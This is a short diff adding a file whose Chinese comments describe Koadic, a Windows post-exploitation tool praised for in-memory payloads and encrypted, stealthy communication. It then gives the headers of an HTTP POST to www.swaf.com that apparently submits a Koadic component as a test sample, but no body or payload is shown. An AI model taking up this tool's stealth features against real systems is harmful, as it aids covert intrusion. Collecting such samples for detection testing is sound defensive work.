@@ -1,0 +1,10 @@
+# 【投递】Koadic黑客工具组件#2
+# Koadic是一款独特的Windows后渗透工具，它采用了Windows脚本主机（JScript/VBScript）作为其主要操作平台，兼容从Windows 2000到Windows 10的所有版本。与Meterpreter和Powershell Empire等其他渗透测试工具相比，Koadic在内存中完全加载payload，并通过SSL和TLS进行加密通信，确保了安全性和隐蔽性。
+POST /?bid=hd_tag_m8mv2658 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2658
+RM-PRO-Token: 07bdbd50fbd093ca1fd91d5a15efb4c5
+RM-PRO-Time: 1742808547473
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=IQY8Njfht0xMehL6vxKyXnh8YEDOVEJv
+
